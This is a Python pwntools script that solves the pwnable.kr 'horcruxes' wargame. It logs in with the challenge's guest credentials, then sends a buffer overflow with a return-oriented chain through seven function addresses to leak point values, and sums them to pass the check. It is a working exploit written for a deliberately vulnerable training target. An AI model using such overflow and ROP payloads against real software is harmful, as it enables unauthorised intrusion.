from pwn import *

context.clear(arch='i386')

def pack(addr):
	i = struct.pack('<I', addr)
	return i

r = ssh(host='pwnable.kr', port=2222,
		user='horcruxes',
		password='guest')

# A, B, C, D, E, F
horcruxes = [0x809fe4b, 0x809fe6a, 0x809fe89, 0x809fea8, 0x809fec7, 0x809fee6, 0x809ff05]
ropme = 0x0809fffc
pad = 120

p = r.process(['nc', '0', '9032'])

p.recvuntil('Select Menu:')
p.sendline('1')
p.recvuntil('How many EXP did you earned? :')

msg = 'A' * pad
for h in horcruxes:
	msg += pack(h)
msg += pack(ropme)

p.sendline(msg)

# irrelevant response
p.recvline()

points = []
total = 0
for _ in range(len(horcruxes)):
	msg = p.recvline()
	log.info(msg[:-1])
	h_points = int(msg.split('+')[1][:-2])
	points.append(h_points)
	total += h_points

log.info('total %d' % total)

p.recvuntil('Select Menu:')
p.sendline('1')
p.recvuntil('How many EXP did you earned? :')
p.sendline(str(total))

log.info(p.recvline())